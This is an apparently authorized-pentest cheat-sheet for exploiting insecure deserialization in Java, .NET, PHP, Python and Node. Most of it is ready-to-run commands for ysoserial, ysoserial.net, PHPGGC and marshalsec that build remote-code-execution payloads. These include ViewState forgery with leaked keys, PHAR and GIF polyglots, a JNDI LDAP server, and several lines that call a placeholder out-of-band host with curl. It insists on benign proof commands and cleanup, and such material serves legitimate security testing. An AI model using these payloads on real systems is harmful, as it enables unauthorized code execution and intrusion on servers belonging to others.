# Gadget-tool cheat-sheet — ysoserial · ysoserial.net · PHPGGC · marshalsec (authorized)

The RCE payloads for Java/.NET/PHP come from purpose-built gadget generators. Install them in Kali/WSL. **Confirm
deserialization with a blind DNS gadget first**, prove with **one benign command** (`id`/`nslookup <token>`), then STOP.

---

## Java — ysoserial  (https://github.com/frohoff/ysoserial)
```bash
# BLIND CONFIRM first (DNS, no code exec, no gadget dependency):
java -jar ysoserial.jar URLDNS "http://UNIQUE.YOUR-OOB" | base64 -w0

# RCE — chain must match a library on the target CLASSPATH (use GadgetProbe to find out):
java -jar ysoserial.jar CommonsCollections5 'nslookup UNIQUE.YOUR-OOB' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR-OOB/j'   | base64 -w0
# common chains: CommonsCollections1-7, CommonsBeanutils1, Spring1/2, Groovy1, Hibernate1/2, ROME, Clojure, C3P0, JRMPClient/JRMPListener
```
- **GadgetProbe** (Burp ext) — fingerprint which gadget libraries are loaded, THEN pick the chain (don't spray).
- **marshalsec** — stand up an LDAP/RMI server for Fastjson/Jackson/SnakeYAML/JNDI (Log4Shell family):
  ```bash
  java -cp marshalsec-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR-OOB:8080/#Exploit" 1389
  ```
- Delivery: the base64 goes into the deserialized cookie/param/field; for RMI/JMX/T3 use the raw object.

## .NET — ysoserial.net  (https://github.com/pwntester/ysoserial.net)
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "nslookup UNIQUE.YOUR-OOB" -o base64
ysoserial.exe -f LosFormatter    -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
# formats: BinaryFormatter, LosFormatter, ObjectStateFormatter, Json.Net, SoapFormatter, NetDataContractSerializer
# gadgets: TypeConfuseDelegate, ObjectDataProvider, WindowsIdentity, DataSet, PSObject, ActivitySurrogateSelector
```
**ViewState** (the flagship .NET vector):
```bash
# no MAC (EnableViewStateMac=false) — no key needed:
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup UNIQUE.YOUR-OOB" --path="/page.aspx" --apppath="/"
# MAC on but machineKey leaked (via ../XXE/ or ../LFI/ reading web.config):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup UNIQUE.YOUR-OOB" \
  --path="/page.aspx" --apppath="/" --generator=<__VIEWSTATEGENERATOR> --validationkey=<HEXKEY> --validationalg=SHA1 [--decryptionkey=<K> --decryptionalg=AES]
```
Telerik `CVE-2019-18935` uses a known key/flow — same idea.

## PHP — PHPGGC  (https://github.com/ambionics/phpggc)
```bash
phpggc -l                                              # list framework chains
phpggc Laravel/RCE1 system 'curl http://YOUR-OOB/p'    # -> serialized string for unserialize()
phpggc Monolog/RCE1 system id
phpggc Symfony/RCE4 system id
# PHAR (no unserialize() call needed — file-op on phar:// deserializes metadata):
phpggc -p phar -f -o evil.phar Monolog/RCE1 system id
# GIF polyglot so image validators pass, then trigger file_exists/getimagesize('phar://evil.gif/x'):
phpggc -p phar -pj 'GIF89a' -o evil.gif Monolog/RCE1 system 'curl http://YOUR-OOB/phar'
```
No framework chain? read the source and build a custom **POP chain** from a `__destruct`/`__wakeup` that reaches a sink.
Auth-bypass without a chain: tamper the object (see `php_object_poc.py`).

## Python / Ruby / Node (native, no external gadget tool)
```bash
python3 pickle_poc.py --dns UNIQUE.YOUR-OOB            # pickle blind confirm (benign)
python3 pickle_poc.py --format yaml --cmd id           # PyYAML unsafe-loader
# Ruby: public universal Marshal/YAML gadget generator -> Marshal.load/YAML.load sink
# Node: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR-OOB/n',()=>{})}()"}  (base64 into the sink)
```

## Detect which gadget libs / scanners
```
GadgetProbe (Burp)   which Java gadget libraries are on the classpath
Freddy (Burp)        passive+active Java & .NET deserialization detection
poc/deser_detect.py  fingerprint the blob's language before you pick a tool
```
> One benign command (`id`/`nslookup <token>`) proves RCE. No reverse shells, no persistence, delete phar/uploads, tear
> down JNDI/LDAP/OOB servers. Authorized targets only.
